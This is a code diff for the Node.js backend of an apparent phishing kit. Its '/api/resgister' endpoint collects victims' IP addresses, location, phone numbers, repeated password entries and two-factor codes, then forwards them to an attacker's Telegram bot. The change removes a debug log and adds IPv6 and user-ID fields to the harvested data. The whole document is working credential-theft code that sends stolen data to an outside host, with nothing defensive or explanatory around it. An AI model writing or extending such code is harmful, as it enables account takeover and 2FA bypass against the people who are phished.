@@ -16,7 +16,6 @@ const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 app.post('/api/resgister', (req, res) => {
     // GET DATA FROM CLIENT
     const data = req.body; 
-    console.log('Dữ liệu nhận được:', data);
 
     const result = {
         "status": 0,
@@ -27,6 +26,7 @@ app.post('/api/resgister', (req, res) => {
 
     // SEND DATA TO TELE
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
+<strong>Ipv6:</strong> ${data.ipv6 ? data.ipv6 : ''}
 <strong>City:</strong> ${data.city ? data.city : ''}
 <strong>Country:</strong> ${data.country ? data.country : ''}
 ------------------------------------------------------------
@@ -37,6 +37,7 @@ app.post('/api/resgister', (req, res) => {
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
 <strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
 <strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
+<strong>ID User:</strong> ${data.idUser ? data.idUser : ''}
 --------------------------------------------
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
 <strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
